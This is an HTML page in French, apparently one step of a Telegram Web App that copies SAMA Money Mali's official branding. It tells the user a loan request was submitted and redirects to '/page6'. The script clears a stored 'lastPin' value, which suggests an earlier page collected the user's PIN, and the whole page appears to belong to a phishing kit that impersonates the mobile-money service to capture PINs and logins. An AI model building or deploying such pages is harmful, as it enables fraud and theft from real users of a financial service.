<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande Soumise - SAMA Money Mali</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            /* Couleurs officielles de l'application SAMA Money (Mali) */
            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
            --sama-blue-dark: #003E7E;     /* Bleu foncé au survol/clic */
            --sama-navy: #0A2540;          /* Bleu nuit pour l'en-tête et le texte */
            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
            --bg-color: #F4F7FA;           /* Fond gris-bleu très clair */
            --card-bg: #FFFFFF;
            --text-dark: #0A2540;
            --text-muted: #5A6B7C;
            --btn-gray-bg: #EEF5FC;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        /* Notification flottante supérieure */
        .toast-notification {
            position: absolute;
            top: 25px;
            background-color: var(--sama-navy);
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 24px rgba(10, 37, 64, 0.15);
            z-index: 100;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.3;
            border-left: 4px solid var(--sama-gold);
        }

        .toast-icon {
            width: 24px;
            height: 24px;
            background-color: var(--sama-gold);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--sama-navy);
            font-size: 14px;
            font-weight: 900;
            flex-shrink: 0;
        }

        /* Conteneur principal de la carte */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 420px;
            margin-top: 45px;
            padding: 40px 24px 35px;
            border-radius: 24px;
            box-shadow: 0 6px 25px rgba(10, 37, 64, 0.07);
            border: 1px solid #E3ECF5;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Cercle de validation (Coche) */
        .check-circle {
            width: 88px;
            height: 88px;
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            border: 3px solid var(--sama-gold);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 28px;
            color: #ffffff;
            font-size: 40px;
            font-weight: 900;
            box-shadow: 0 6px 20px rgba(0, 85, 165, 0.3);
        }

        .main-title {
            font-size: 25px;
            color: var(--text-dark);
            margin: 0 0 20px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .message-text {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0 0 16px;
            line-height: 1.55;
            max-width: 320px;
        }

        /* Boîte de redirection avec compte à rebours et indicateur d'activité */
        .redirect-box {
            background-color: var(--btn-gray-bg);
            border: 1px solid #C5DDF5;
            border-radius: 12px;
            padding: 16px 20px;
            margin: 20px 0 16px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: var(--sama-navy);
            font-weight: 700;
            font-size: 15px;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 2.5px solid #D6E4F0;
            border-top: 2.5px solid var(--sama-blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Bouton d'action secondaire contouré */
        .btn-outline {
            background-color: transparent;
            color: var(--text-dark);
            border: 2px solid #C5DDF5;
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-outline:active {
            background-color: #EEF5FC;
            border-color: var(--sama-blue);
        }
    </style>
</head>

<body>

<!-- Notification flottante supérieure -->
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 Demande<br>soumise avec succès !</div>
</div>

<!-- Conteneur de la carte -->
<div class="card">
    <!-- Grand cercle avec coche -->
    <div class="check-circle">✓</div>

    <!-- Titre et descriptions -->
    <h1 class="main-title">Demande Soumise</h1>

    <p class="message-text">
        Votre demande de prêt a été soumise avec succès. Veuillez patienter pour l'approbation.
    </p>

    <p class="message-text">
        Vous recevrez un message de confirmation. Connectez-vous à SAMA Money pour continuer.
    </p>

    <!-- Boîte de compte à rebours de redirection -->
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>Redirection dans <span id="timer">3</span> s...</span>
    </div>

    <!-- Bouton de connexion secondaire -->
    <button type="button" class="btn-outline" onclick="goToPage6()">
        Se connecter maintenant
    </button>
</div>

<script>
    let timeLeft = 3;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);

        // Effacer le stockage temporaire du code PIN avant la redirection
        localStorage.removeItem('lastPin');
        
        window.location.href = "/page6";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        updateTimer();

        interval = setInterval(() => {
            timeLeft--;

            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }

            updateTimer();
        }, 1000);
    };
</script>

</body>
</html>
